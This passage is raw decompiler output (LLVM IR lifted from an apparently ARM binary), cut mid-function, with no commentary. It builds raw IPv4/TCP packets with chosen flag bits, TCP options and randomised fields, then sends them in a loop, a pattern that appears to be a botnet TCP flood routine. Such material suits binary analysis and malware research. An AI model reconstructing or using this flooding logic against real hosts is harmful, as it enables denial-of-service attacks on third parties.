  %v5_c38c = call i32 @function_11aa8(i32 %v3_c360, i32 0, i32 3, i32 %v6_c378, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_c38c, i32* %r0.global-to-local, align 4
  %v7_c390 = icmp eq i32 %v5_c38c, -1
  store i1 %v7_c390, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c390, label %dec_label_pc_c830, label %dec_label_pc_c398

dec_label_pc_c398:                                ; preds = %dec_label_pc_c370
  %v3_c3a0 = mul i32 %v7_c1f4, 65536
  store i32 %v3_c3a0, i32* %r0.global-to-local, align 4
  %v0_c3a4 = load i32, i32* %fp.global-to-local, align 4
  %v3_c3a4 = mul i32 %v0_c3a4, 65536
  store i32 %v3_c3a4, i32* %r4.global-to-local, align 4
  %v0_c3a8 = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_c2b8, i32* %r2.global-to-local, align 4
  %v3_c3b4 = urem i32 %v7_c1f4, 65536
  store i32 %v3_c3b4, i32* %r3.global-to-local, align 4
  %v3_c3b8 = urem i32 %v0_c3a4, 65536
  %v3_c3bc = urem i32 %v0_c3a8, 65536
  store i32 %v3_c3bc, i32* %r1.global-to-local, align 4
  %v0_c3c0 = load i32, i32* @r7, align 4
  %v2_c3c0 = icmp eq i32 %v0_c3c0, 0
  store i1 %v2_c3c0, i1* %cpsr_z.global-to-local, align 1
  %v1_c3d0 = urem i32 %v6_c2b8, 256
  store i32 %v1_c3d0, i32* @fp, align 4
  br i1 %v2_c3c0, label %dec_label_pc_c624.preheader, label %dec_label_pc_c3d8

dec_label_pc_c3d8:                                ; preds = %dec_label_pc_c398
  %tmp52 = mul i32 %v5_c288, 256
  %v3_c3f0 = and i32 %tmp52, 65280
  %tmp53 = udiv i32 %v7_c1f4, 256
  %v3_c3f4 = urem i32 %tmp53, 256
  %tmp54 = udiv i32 %v5_c288, 256
  %v4_c3fc = urem i32 %tmp54, 256
  %v5_c3fc = or i32 %v4_c3fc, %v3_c3f0
  store i32 %v5_c3fc, i32* @lr, align 4
  %v1_c3f8 = mul i32 %v7_c1f4, 256
  %v4_c400 = and i32 %v1_c3f8, 65280
  %v5_c400 = or i32 %v4_c400, %v3_c3f4
  %tmp55 = mul i32 %v0_c3a4, 256
  %v3_c40c = and i32 %tmp55, 65280
  %tmp56 = mul i32 %v0_c3a8, 256
  %v3_c410 = and i32 %tmp56, 65280
  %v1_c414 = urem i32 %v6_c2b8, 2
  %v1_c418 = urem i32 %v6_c2d0, 2
  %tmp57 = udiv i32 %v0_c3a4, 256
  %v4_c41c = urem i32 %tmp57, 256
  %v5_c41c = or i32 %v4_c41c, %v3_c40c
  store i32 %v5_c41c, i32* @r6, align 4
  %tmp58 = udiv i32 %v0_c3a8, 256
  %v4_c420 = urem i32 %tmp58, 256
  %v5_c420 = or i32 %v4_c420, %v3_c410
  store i32 %v5_c420, i32* @r5, align 4
  %v1_c43c = urem i32 %v6_c2e8, 2
  store i32 %v1_c43c, i32* %r2.global-to-local, align 4
  %v1_c440 = urem i32 %v6_c300, 2
  store i32 %v1_c440, i32* %r3.global-to-local, align 4
  %v1_c444 = urem i32 %v6_c318, 2
  store i32 %v1_c444, i32* %r0.global-to-local, align 4
  %v1_c448 = urem i32 %v6_c330, 2
  store i32 %v1_c448, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext4 = mul nuw i32 %v5_c400, 65536
  %v4_c4d0 = sdiv i32 %sext4, 65536
  %tmp = sub nsw i32 0, %v1_c418
  %v4_c534 = and i32 %tmp, 16
  %tmp62 = sub nsw i32 0, %v1_c43c
  %v4_c548 = and i32 %tmp62, 8
  %tmp63 = sub nsw i32 0, %v1_c440
  %v4_c560 = and i32 %tmp63, 4
  %tmp64 = sub nsw i32 0, %v1_c444
  %v3_c574 = and i32 %tmp64, 2
  %v1_c4c4 = trunc i32 %v6_c20c to i8
  br label %dec_label_pc_c468

dec_label_pc_c468:                                ; preds = %bb61, %dec_label_pc_c3d8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_c470 = call i32 @function_12654(i32 128, i32 1)
  store i32 %v2_c470, i32* %r0.global-to-local, align 4
  %v3_c474 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c474, i32* %r2.global-to-local, align 4
  %v1_c478 = load i32, i32* @sb, align 4
  %v2_c478 = load i32, i32* @r4, align 4
  %v5_c478 = mul i32 %v2_c478, 4
  %v6_c478 = add i32 %v5_c478, %v1_c478
  %v7_c478 = inttoptr i32 %v6_c478 to i32*
  store i32 %v2_c470, i32* %v7_c478, align 4
  %v0_c47c = load i32, i32* %r2.global-to-local, align 4
  %v3_c47c = mul i32 %v0_c47c, 32
  store i32 %v3_c47c, i32* %r3.global-to-local, align 4
  %v0_c480 = load i32, i32* @sb, align 4
  %v4_c480 = mul i32 %v0_c47c, 4
  %v5_c480 = add i32 %v0_c480, %v4_c480
  %v6_c480 = inttoptr i32 %v5_c480 to i32*
  %v7_c480 = load i32, i32* %v6_c480, align 4
  store i32 %v7_c480, i32* %r4.global-to-local, align 4
  %v5_c484 = mul i32 %v0_c47c, 24
  store i32 %v5_c484, i32* %r3.global-to-local, align 4
  %v1_c488 = load i32, i32* @r8, align 4
  %v2_c488 = add i32 %v1_c488, %v5_c484
  store i32 %v2_c488, i32* %r0.global-to-local, align 4
  %v1_c48c = inttoptr i32 %v7_c480 to i8*
  %v2_c48c = load i8, i8* %v1_c48c, align 1
  %tmp65 = urem i8 %v2_c48c, 16
  %v1_c490 = zext i8 %tmp65 to i32
  %v1_c494 = or i32 %v1_c490, 64
  store i32 %v1_c494, i32* %r3.global-to-local, align 4
  %v1_c498 = trunc i32 %v1_c494 to i8
  store i8 %v1_c498, i8* %v1_c48c, align 1
  %v0_c49c = load i32, i32* %r4.global-to-local, align 4
  %v1_c49c = inttoptr i32 %v0_c49c to i8*
  %v2_c49c = load i8, i8* %v1_c49c, align 1
  %v1_c4a0 = and i8 %v2_c49c, -16
  %v1_c4a4 = or i8 %v1_c4a0, 5
  store i32 %v1_c238, i32* %r3.global-to-local, align 4
  store i8 %v1_c4a4, i8* %v1_c49c, align 1
  %v2_c4b4 = load i32, i32* %r4.global-to-local, align 4
  %v3_c4b4 = add i32 %v2_c4b4, 1
  %v4_c4b4 = inttoptr i32 %v3_c4b4 to i8*
  store i8 %v5_c1f0, i8* %v4_c4b4, align 1
  store i32 %v1_c214, i32* %r2.global-to-local, align 4
  %v0_c4bc = load i32, i32* %r3.global-to-local, align 4
  %v2_c4bc = icmp eq i32 %v0_c4bc, 0
  store i1 %v2_c4bc, i1* %cpsr_z.global-to-local, align 1
  store i32 15360, i32* %r3.global-to-local, align 4
  %v2_c4c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_c4c4 = add i32 %v2_c4c4, 8
  %v4_c4c4 = inttoptr i32 %v3_c4c4 to i8*
  store i8 %v1_c4c4, i8* %v4_c4c4, align 1
  %v0_c4c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_c4c8 = trunc i32 %v0_c4c8 to i16
  %v2_c4c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c4c8 = add i32 %v2_c4c8, 2
  %v4_c4c8 = inttoptr i32 %v3_c4c8 to i16*
  store i16 %v1_c4c8, i16* %v4_c4c8, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_c4d0, i32* %r1.global-to-local, align 4
  %v0_c4d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c4d4, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_c468
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_c468, %bb
  %v2_c4d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c4d8 = add i32 %v2_c4d8, 9
  %v4_c4d8 = inttoptr i32 %v3_c4d8 to i8*
  store i8 6, i8* %v4_c4d8, align 1
  %v0_c4dc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c4dc, label %bb61, label %bb60

bb60:                                             ; preds = %bb59
  %v1_c4dc = load i32, i32* %r2.global-to-local, align 4
  %v2_c4dc = trunc i32 %v1_c4dc to i16
  %v3_c4dc = load i32, i32* %r4.global-to-local, align 4
  %v4_c4dc = add i32 %v3_c4dc, 6
  %v5_c4dc = inttoptr i32 %v4_c4dc to i16*
  store i16 %v2_c4dc, i16* %v5_c4dc, align 2
  br label %bb61

bb61:                                             ; preds = %bb59, %bb60
  store i32 %v6_c34c, i32* %r2.global-to-local, align 4
  %v1_c4e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_c4e4 = add i32 %v1_c4e4, 12
  %v3_c4e4 = inttoptr i32 %v2_c4e4 to i32*
  store i32 %v6_c34c, i32* %v3_c4e4, align 4
  %v0_c4e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_c4e8 = add i32 %v0_c4e8, 16
  %v2_c4e8 = inttoptr i32 %v1_c4e8 to i32*
  %v3_c4e8 = load i32, i32* %v2_c4e8, align 4
  store i32 %v3_c4e8, i32* %r3.global-to-local, align 4
  %v0_c4ec = load i32, i32* %r1.global-to-local, align 4
  %v1_c4ec = trunc i32 %v0_c4ec to i16
  %v2_c4ec = load i32, i32* %r4.global-to-local, align 4
  %v3_c4ec = add i32 %v2_c4ec, 4
  %v4_c4ec = inttoptr i32 %v3_c4ec to i16*
  store i16 %v1_c4ec, i16* %v4_c4ec, align 2
  %v0_c4f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c4f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_c4f0 = add i32 %v1_c4f0, 16
  %v3_c4f0 = inttoptr i32 %v2_c4f0 to i32*
  store i32 %v0_c4f0, i32* %v3_c4f0, align 4
  %v0_c4f4 = load i32, i32* @r6, align 4
  %v1_c4f4 = trunc i32 %v0_c4f4 to i16
  %v2_c4f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_c4f4 = add i32 %v2_c4f4, 20
  %v4_c4f4 = inttoptr i32 %v3_c4f4 to i16*
  store i16 %v1_c4f4, i16* %v4_c4f4, align 2
  %v0_c4f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c4f8 = add i32 %v0_c4f8, 20
  store i32 %v1_c4f8, i32* %r1.global-to-local, align 4
  %v1_c4fc = add i32 %v0_c4f8, 32
  %v2_c4fc = inttoptr i32 %v1_c4fc to i8*
  %v3_c4fc = load i8, i8* %v2_c4fc, align 1
  %v4_c4fc = zext i8 %v3_c4fc to i32
  store i32 %v4_c4fc, i32* %r3.global-to-local, align 4
  %v1_c500 = add i32 %v0_c4f8, 33
  %v2_c500 = inttoptr i32 %v1_c500 to i8*
  %v3_c500 = load i8, i8* %v2_c500, align 1
  %v4_c500 = zext i8 %v3_c500 to i32
  store i32 %v1_c414, i32* %r0.global-to-local, align 4
  %v1_c508 = urem i8 %v3_c4fc, 16
  %v1_c50c = or i8 %v1_c508, -96
  %v1_c510 = and i32 %v4_c500, 223
  store i32 %v1_c510, i32* %r2.global-to-local, align 4
  store i8 %v1_c50c, i8* %v2_c4fc, align 1
  %v0_c518 = load i32, i32* %r2.global-to-local, align 4
  %v1_c518 = load i32, i32* %r0.global-to-local, align 4
  %v4_c518 = mul i32 %v1_c518, 32
  %v5_c518 = or i32 %v4_c518, %v0_c518
  store i32 %v5_c518, i32* %r2.global-to-local, align 4
  store i32 %v5_c3fc, i32* %r3.global-to-local, align 4
  %v1_c520 = trunc i32 %v5_c518 to i8
  %v2_c520 = load i32, i32* %r1.global-to-local, align 4
  %v3_c520 = add i32 %v2_c520, 13
  %v4_c520 = inttoptr i32 %v3_c520 to i8*
  store i8 %v1_c520, i8* %v4_c520, align 1
  %v0_c524 = load i32, i32* %r3.global-to-local, align 4
  %v1_c524 = load i32, i32* %r1.global-to-local, align 4
  %v2_c524 = add i32 %v1_c524, 4
  %v3_c524 = inttoptr i32 %v2_c524 to i32*
  store i32 %v0_c524, i32* %v3_c524, align 4
  %v0_c528 = load i32, i32* %r1.global-to-local, align 4
  %v1_c528 = add i32 %v0_c528, 13
  %v2_c528 = inttoptr i32 %v1_c528 to i8*
  %v3_c528 = load i8, i8* %v2_c528, align 1
  %v4_c528 = zext i8 %v3_c528 to i32
  store i32 %v1_c418, i32* %r0.global-to-local, align 4
  %v1_c530 = and i32 %v4_c528, 239
  %v5_c534 = or i32 %v1_c530, %v4_c534
  store i32 %v5_c534, i32* %r3.global-to-local, align 4
  %v1_c538 = trunc i32 %v5_c534 to i8
  store i8 %v1_c538, i8* %v2_c528, align 1
  %v0_c53c = load i32, i32* %r1.global-to-local, align 4
  %v1_c53c = add i32 %v0_c53c, 13
  %v2_c53c = inttoptr i32 %v1_c53c to i8*
  %v3_c53c = load i8, i8* %v2_c53c, align 1
  %v4_c53c = zext i8 %v3_c53c to i32
  store i32 %v1_c43c, i32* %r3.global-to-local, align 4
  %v1_c544 = and i32 %v4_c53c, 247
  %v5_c548 = or i32 %v1_c544, %v4_c548
  store i32 %v5_c548, i32* %r2.global-to-local, align 4
  %v0_c54c = load i32, i32* @r5, align 4
  %v1_c54c = trunc i32 %v0_c54c to i16
  %v3_c54c = add i32 %v0_c53c, 2
  %v4_c54c = inttoptr i32 %v3_c54c to i16*
  store i16 %v1_c54c, i16* %v4_c54c, align 2
  %v0_c550 = load i32, i32* %r2.global-to-local, align 4
  %v1_c550 = trunc i32 %v0_c550 to i8
  %v2_c550 = load i32, i32* %r1.global-to-local, align 4
  %v3_c550 = add i32 %v2_c550, 13
  %v4_c550 = inttoptr i32 %v3_c550 to i8*
  store i8 %v1_c550, i8* %v4_c550, align 1
  %v0_c554 = load i32, i32* %r1.global-to-local, align 4
  %v1_c554 = add i32 %v0_c554, 13
  %v2_c554 = inttoptr i32 %v1_c554 to i8*
  %v3_c554 = load i8, i8* %v2_c554, align 1
  %v4_c554 = zext i8 %v3_c554 to i32
  store i32 %v1_c440, i32* %r0.global-to-local, align 4
  %v1_c55c = and i32 %v4_c554, 251
  %v5_c560 = or i32 %v1_c55c, %v4_c560
  store i32 %v5_c560, i32* %r3.global-to-local, align 4
  %v1_c564 = trunc i32 %v5_c560 to i8
  store i8 %v1_c564, i8* %v2_c554, align 1
  %v0_c568 = load i32, i32* %r1.global-to-local, align 4
  %v1_c568 = add i32 %v0_c568, 13
  %v2_c568 = inttoptr i32 %v1_c568 to i8*
  %v3_c568 = load i8, i8* %v2_c568, align 1
  %v4_c568 = zext i8 %v3_c568 to i32
  store i32 %v1_c444, i32* %r3.global-to-local, align 4
  %v1_c570 = and i32 %v4_c568, 253
  %v4_c574 = or i32 %v1_c570, %v3_c574
  store i32 %v4_c574, i32* %r2.global-to-local, align 4
  %v1_c578 = trunc i32 %v4_c574 to i8
  store i8 %v1_c578, i8* %v2_c568, align 1
  %v0_c57c = load i32, i32* %r1.global-to-local, align 4
  %v1_c57c = add i32 %v0_c57c, 13
  %v2_c57c = inttoptr i32 %v1_c57c to i8*
  %v3_c57c = load i8, i8* %v2_c57c, align 1
  %v4_c57c = zext i8 %v3_c57c to i32
  store i32 %v1_c448, i32* %r0.global-to-local, align 4
  %v1_c584 = and i32 %v4_c57c, 254
  %v2_c588 = or i32 %v1_c584, %v1_c448
  store i32 %v2_c588, i32* %r3.global-to-local, align 4
  %v1_c58c = trunc i32 %v2_c588 to i8
  store i8 %v1_c58c, i8* %v2_c57c, align 1
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_c598 = load i32, i32* %r4.global-to-local, align 4
  %v3_c598 = add i32 %v2_c598, 40
  %v4_c598 = inttoptr i32 %v3_c598 to i8*
  store i8 2, i8* %v4_c598, align 1
  %v0_c59c = load i32, i32* %r2.global-to-local, align 4
  %v1_c59c = trunc i32 %v0_c59c to i8
  %v2_c59c = load i32, i32* %r4.global-to-local, align 4
  %v3_c59c = add i32 %v2_c59c, 41
  %v4_c59c = inttoptr i32 %v3_c59c to i8*
  store i8 %v1_c59c, i8* %v4_c59c, align 1
  %v0_c5a0 = call i32 @function_e0d0()
  %v1_c5a4 = urem i32 %v0_c5a0, 16
  %v1_c5a8 = or i32 %v1_c5a4, 1392
  %tmp66 = mul nuw nsw i32 %v1_c5a8, 256
  %v3_c5b4 = add nuw nsw i32 %tmp66, 2048
  %v5_c5bc = or i32 %v3_c5b4, 5
  %v1_c5c0 = trunc i32 %v5_c5bc to i16
  %v2_c5c0 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5c0 = add i32 %v2_c5c0, 42
  %v4_c5c0 = inttoptr i32 %v3_c5c0 to i16*
  store i16 %v1_c5c0, i16* %v4_c5c0, align 2
  %v2_c5c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5c8 = add i32 %v2_c5c8, 44
  %v4_c5c8 = inttoptr i32 %v3_c5c8 to i8*
  store i8 4, i8* %v4_c5c8, align 1
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_c5d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5d8 = add i32 %v2_c5d8, 46
  %v4_c5d8 = inttoptr i32 %v3_c5d8 to i8*
  store i8 8, i8* %v4_c5d8, align 1
  %v0_c5dc = load i32, i32* %r2.global-to-local, align 4
  %v1_c5dc = trunc i32 %v0_c5dc to i8
  %v2_c5dc = load i32, i32* %r4.global-to-local, align 4
  %v3_c5dc = add i32 %v2_c5dc, 47
  %v4_c5dc = inttoptr i32 %v3_c5dc to i8*
  store i8 %v1_c5dc, i8* %v4_c5dc, align 1
  %v0_c5e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_c5e0 = trunc i32 %v0_c5e0 to i8
  %v2_c5e0 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5e0 = add i32 %v2_c5e0, 45
  %v4_c5e0 = inttoptr i32 %v3_c5e0 to i8*
  store i8 %v1_c5e0, i8* %v4_c5e0, align 1
  %v0_c5e4 = call i32 @function_e0d0()
  store i32 %v0_c5e4, i32* %r0.global-to-local, align 4
  %v2_c5ec = load i32, i32* %r4.global-to-local, align 4
  %v3_c5ec = add i32 %v2_c5ec, 59
  %v4_c5ec = inttoptr i32 %v3_c5ec to i8*
  store i8 6, i8* %v4_c5ec, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_c5fc = load i32, i32* %r4.global-to-local, align 4
  %v2_c5fc = add i32 %v1_c5fc, 48
  %v3_c5fc = inttoptr i32 %v2_c5fc to i32*
  store i32 %v0_c5e4, i32* %v3_c5fc, align 4
  %v0_c600 = load i32, i32* %r3.global-to-local, align 4
  %v1_c600 = load i32, i32* %r4.global-to-local, align 4
  %v2_c600 = add i32 %v1_c600, 52
  %v3_c600 = inttoptr i32 %v2_c600 to i32*
  store i32 %v0_c600, i32* %v3_c600, align 4
  %v0_c604 = load i32, i32* %r2.global-to-local, align 4
  %v1_c604 = trunc i32 %v0_c604 to i8
  %v2_c604 = load i32, i32* %r4.global-to-local, align 4
  %v3_c604 = add i32 %v2_c604, 56
  %v4_c604 = inttoptr i32 %v3_c604 to i8*
  store i8 %v1_c604, i8* %v4_c604, align 1
  %v0_c608 = load i32, i32* %r1.global-to-local, align 4
  %v1_c608 = trunc i32 %v0_c608 to i8
  %v2_c608 = load i32, i32* %r4.global-to-local, align 4
  %v3_c608 = add i32 %v2_c608, 58
  %v4_c608 = inttoptr i32 %v3_c608 to i8*
  store i8 %v1_c608, i8* %v4_c608, align 1
  %v0_c60c = load i32, i32* %r1.global-to-local, align 4
  %v1_c60c = trunc i32 %v0_c60c to i8
  %v2_c60c = load i32, i32* %r4.global-to-local, align 4
  %v3_c60c = add i32 %v2_c60c, 57
  %v4_c60c = inttoptr i32 %v3_c60c to i8*
  store i8 %v1_c60c, i8* %v4_c60c, align 1
  %v3_c610 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c610, i32* %r3.global-to-local, align 4
  %v1_c614 = load i32, i32* %r2.global-to-local, align 4
  %v2_c614 = add i32 %v1_c614, %v3_c610
  store i32 %v2_c614, i32* @r4, align 4
  %v1_c618 = load i32, i32* @r7, align 4
  %v9_c618 = icmp eq i32 %v2_c614, %v1_c618
  store i1 %v9_c618, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_c614, i32* %stack_var_-44, align 4
  %v5_c620 = icmp slt i32 %v2_c614, %v1_c618
  br i1 %v5_c620, label %dec_label_pc_c468, label %dec_label_pc_c624.preheader

dec_label_pc_c624.preheader:                      ; preds = %bb61, %dec_label_pc_c398
  %v0_c6286 = phi i32 [ 0, %dec_label_pc_c398 ], [ %v1_c618, %bb61 ]
  %v3_c7a0 = icmp eq i32 %v6_c34c, -1
  %v8_c7a0 = icmp eq i32 %v6_c34c, -1
  %v3_c670 = icmp eq i32 %v3_c3b4, 65535
  br label %dec_label_pc_c624

dec_label_pc_c624:                                ; preds = %dec_label_pc_c624, %dec_label_pc_c734, %dec_label_pc_c624.preheader
  %v0_c628 = phi i32 [ %v0_c6286, %dec_label_pc_c624.preheader ], [ 0, %dec_label_pc_c734 ], [ 0, %dec_label_pc_c624 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c628 = icmp eq i32 %v0_c628, 0
  store i1 %v2_c628, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c628, label %dec_label_pc_c624, label %dec_label_pc_c634

dec_label_pc_c634:                                ; preds = %dec_label_pc_c624, %dec_label_pc_c734
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c638

dec_label_pc_c638:                                ; preds = %dec_label_pc_c6b0, %dec_label_pc_c634
  %v1_c648 = phi i32 [ %v1_c724, %dec_label_pc_c6b0 ], [ 0, %dec_label_pc_c634 ]
  %v5_c63c = mul i32 %v1_c648, 24
  %v1_c640 = load i32, i32* @r8, align 4
  %v2_c640 = add i32 %v1_c640, %v5_c63c
  store i32 %v2_c640, i32* %r3.global-to-local, align 4
  %v1_c644 = add i32 %v2_c640, 20
  %v2_c644 = inttoptr i32 %v1_c644 to i8*
  %v3_c644 = load i8, i8* %v2_c644, align 1
  %v4_c644 = zext i8 %v3_c644 to i32
  store i32 %v4_c644, i32* %r2.global-to-local, align 4
  %v0_c648 = load i32, i32* @sb, align 4
  %v4_c648 = mul i32 %v1_c648, 4
  %v5_c648 = add i32 %v0_c648, %v4_c648
  %v6_c648 = inttoptr i32 %v5_c648 to i32*
  %v7_c648 = load i32, i32* %v6_c648, align 4
  store i32 %v7_c648, i32* @r5, align 4
  %v7_c64c = icmp eq i8 %v3_c644, 31
  store i1 %v7_c64c, i1* %cpsr_z.global-to-local, align 1
  %v1_c650 = add i32 %v7_c648, 20
  store i32 %v1_c650, i32* @r6, align 4
  %tmp67 = icmp ult i8 %v3_c644, 32
  br i1 %tmp67, label %dec_label_pc_c748, label %dec_label_pc_c658

dec_label_pc_c658:                                ; preds = %dec_label_pc_c638
  store i32 %v6_c34c, i32* %r3.global-to-local, align 4
  store i1 %v8_c7a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c7a0, label %dec_label_pc_c7a8, label %dec_label_pc_c664

dec_label_pc_c664:                                ; preds = %dec_label_pc_c748, %dec_label_pc_c658
  store i32 %v3_c3b4, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c670, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c670, label %dec_label_pc_c7c4, label %dec_label_pc_c678

dec_label_pc_c678:                                ; preds = %dec_label_pc_c7a8, %dec_label_pc_c664
  %v1_c67c = phi i32 [ %v1_c7b8, %dec_label_pc_c7a8 ], [ 65535, %dec_label_pc_c664 ]
  store i32 %v3_c3b8, i32* %r1.global-to-local, align 4
  %v9_c67c = icmp eq i32 %v3_c3b8, %v1_c67c
  store i1 %v9_c67c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c67c, label %dec_label_pc_c7d8, label %dec_label_pc_c684

dec_label_pc_c684:                                ; preds = %dec_label_pc_c7c4.dec_label_pc_c684_crit_edge, %dec_label_pc_c678
  %v1_c688 = phi i32 [ %v1_c688.pre, %dec_label_pc_c7c4.dec_label_pc_c684_crit_edge ], [ %v1_c67c, %dec_label_pc_c678 ]
  store i32 %v3_c3bc, i32* %r2.global-to-local, align 4
  %v9_c688 = icmp eq i32 %v3_c3bc, %v1_c688
  store i1 %v9_c688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c688, label %dec_label_pc_c7ec, label %dec_label_pc_c690

dec_label_pc_c690:                                ; preds = %dec_label_pc_c7d8.dec_label_pc_c690_crit_edge, %dec_label_pc_c684
  %v1_c694 = phi i32 [ %v1_c694.pre, %dec_label_pc_c7d8.dec_label_pc_c690_crit_edge ], [ %v1_c688, %dec_label_pc_c684 ]
  store i32 %v5_c288, i32* %r3.global-to-local, align 4
  %v9_c694 = icmp eq i32 %v5_c288, %v1_c694
  store i1 %v9_c694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c694, label %dec_label_pc_c800, label %dec_label_pc_c69c

dec_label_pc_c69c:                                ; preds = %dec_label_pc_c7ec.dec_label_pc_c69c_crit_edge, %dec_label_pc_c690
  %v1_c6a0 = phi i32 [ %v1_c6a0.pre, %dec_label_pc_c7ec.dec_label_pc_c69c_crit_edge ], [ %v1_c694, %dec_label_pc_c690 ]
  store i32 %v6_c2a0, i32* %r0.global-to-local, align 4
  %v9_c6a0 = icmp eq i32 %v6_c2a0, %v1_c6a0
  store i1 %v9_c6a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6a0, label %dec_label_pc_c814, label %dec_label_pc_c6a8

dec_label_pc_c6a8:                                ; preds = %dec_label_pc_c800, %dec_label_pc_c69c
  %v0_c6a8 = load i32, i32* @fp, align 4
  %v2_c6a8 = icmp eq i32 %v0_c6a8, 0
  store i1 %v2_c6a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c6a8, label %dec_label_pc_c6b0, label %dec_label_pc_c824

dec_label_pc_c6b0:                                ; preds = %dec_label_pc_c6a8, %dec_label_pc_c814, %dec_label_pc_c824
  %v2_c6b4 = load i32, i32* @r5, align 4
  %v3_c6b4 = add i32 %v2_c6b4, 10
  %v4_c6b4 = inttoptr i32 %v3_c6b4 to i16*
  store i16 0, i16* %v4_c6b4, align 2
  %v0_c6b8 = load i32, i32* @r5, align 4
  store i32 %v0_c6b8, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_c6c0 = call i32 @function_c848(i32 %v0_c6b8, i32 20)
  %v3_c6c0 = trunc i32 %v2_c6c0 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c6c8 = load i32, i32* @r5, align 4
  %v4_c6c8 = add i32 %v3_c6c8, 10
  %v5_c6c8 = inttoptr i32 %v4_c6c8 to i16*
  store i16 %v3_c6c0, i16* %v5_c6c8, align 2
  %v0_c6cc = load i32, i32* @r6, align 4
  store i32 %v0_c6cc, i32* @r1, align 4
  %v0_c6d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_c6d0 = trunc i32 %v0_c6d0 to i16
  %v3_c6d0 = add i32 %v0_c6cc, 16
  %v4_c6d0 = inttoptr i32 %v3_c6d0 to i16*
  store i16 %v1_c6d0, i16* %v4_c6d0, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_c6dc = load i32, i32* @r5, align 4
  store i32 %v0_c6dc, i32* %r0.global-to-local, align 4
  %v4_c6e0 = call i32 @function_c898(i32 %v0_c6dc, i32 %v0_c6cc, i32 10240, i32 40)
  %v5_c6e0 = trunc i32 %v4_c6e0 to i16
  store i32 %v4_c6e0, i32* %r0.global-to-local, align 4
  %v3_c6e4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c6e4, i32* %r3.global-to-local, align 4
  %v3_c6e8 = mul i32 %v3_c6e4, 32
  store i32 %v3_c6e8, i32* %lr.global-to-local, align 4
  %v3_c6ec = load i32, i32* @r6, align 4
  %v4_c6ec = add i32 %v3_c6ec, 16
  %v5_c6ec = inttoptr i32 %v4_c6ec to i16*
  store i16 %v5_c6e0, i16* %v5_c6ec, align 2
  %v0_c6f0 = load i32, i32* %lr.global-to-local, align 4
  %v1_c6f0 = load i32, i32* %r3.global-to-local, align 4
  %tmp68 = mul i32 %v1_c6f0, -8
  %v5_c6f0 = add i32 %v0_c6f0, %tmp68
  store i32 %v5_c6f0, i32* %lr.global-to-local, align 4
  %v0_c6f4 = load i32, i32* @r6, align 4
  %v1_c6f4 = add i32 %v0_c6f4, 2
  %v2_c6f4 = inttoptr i32 %v1_c6f4 to i16*
  %v3_c6f4 = load i16, i16* %v2_c6f4, align 2
  %v1_c6f8 = load i32, i32* @r8, align 4
  %v2_c6f8 = add i32 %v1_c6f8, %v5_c6f0
  store i32 %v2_c6f8, i32* @lr, align 4
  %v3_c6fc = add i32 %v2_c6f8, 2
  %v4_c6fc = inttoptr i32 %v3_c6fc to i16*
  store i16 %v3_c6f4, i16* %v4_c6fc, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c708 = load i32, i32* @r5, align 4
  store i32 %v0_c708, i32* %r1.global-to-local, align 4
  %v0_c70c = load i32, i32* @sl, align 4
  store i32 %v0_c70c, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_c714 = load i32, i32* @lr, align 4
  %v6_c71c = call i32 @function_11a68(i32 %v0_c70c, i32 %v0_c708, i32 60, i32 16384, i32 %v0_c714, i32 16)
